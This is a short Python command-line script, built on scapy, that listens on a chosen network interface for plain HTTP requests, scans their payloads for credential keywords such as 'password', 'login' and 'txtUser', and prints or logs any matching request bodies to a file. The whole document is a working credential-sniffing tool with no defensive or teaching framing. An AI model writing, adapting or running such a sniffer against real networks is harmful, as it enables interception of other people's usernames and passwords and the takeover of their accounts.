import scapy.all as scapy
from scapy.layers import http
import sys
import os
import argparse
import platform

parser=argparse.ArgumentParser()
parser.add_argument("-i", dest="interface", help="use this interface for capturing")
parser.add_argument("-w", dest="write", help="write to file")
insert=parser.parse_args()
i=insert.interface
file=insert.write
if file!=None:
    of=open(file, "a")
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_process, filter="port 80")    

def packet_process(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            content=packet[scapy.Raw].load
            keywords=["pwd", "passwd", "password", "usr", "user", "uname", "login", "pass", "submit", "txtPassword", "txtUser"]
            try:
                content=content.decode("utf-8")
                for key in keywords:
                    if key in content:
                        print(content)
                        if file!=None:
                            of.writelines(str(content)+(str("\n")))
                        break
            except:
                pass

if i==None:
    print("[!] No interface specified")
    print("[I] sniff.py -i INTERFACE")

if i!=None:
    print("[+] waiting...")
    sniff(i)
